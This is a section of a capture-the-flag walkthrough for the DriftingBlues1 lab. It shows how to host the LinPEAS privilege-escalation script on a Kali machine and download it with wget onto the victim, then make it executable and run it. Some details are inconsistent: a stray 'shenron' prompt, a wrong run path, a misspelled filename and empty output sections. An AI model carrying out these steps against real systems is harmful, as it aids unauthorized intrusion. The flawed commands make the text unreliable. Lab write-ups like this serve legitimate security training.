5.1 Linpeas.sh



1. Installing LinPEAS.
LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz.

2. Download the file “linpea.sh” from https://github.com/kairosart/linpeas to your Kali Machine and copy it to your working directory on the Kali Machine. In this case “/home/kali/driftingblues1$”

3. On your Kali Machine open a Python Web Sever.
kali@kali:~/driftingblues1$python3 -m http.server


Output:


4. On the victime machine run the following commands to get the Linpeas file.
eric@driftingblues:~$cd /tmp
eric@driftingblues:/tmp$wget http://192.168.12.10:8000/linpeas.sh
shenron@shenron:/tmp$chmod +x linpeas.sh


Output:


5. Run “linpeas.sh”.
eric@driftingblues:/tmp$ /linpeas.sh | tee output


If you look in the section “Modified interesting files in the last 5mins (limit 100)” you'll find a “/tmp/backup.zip” file.
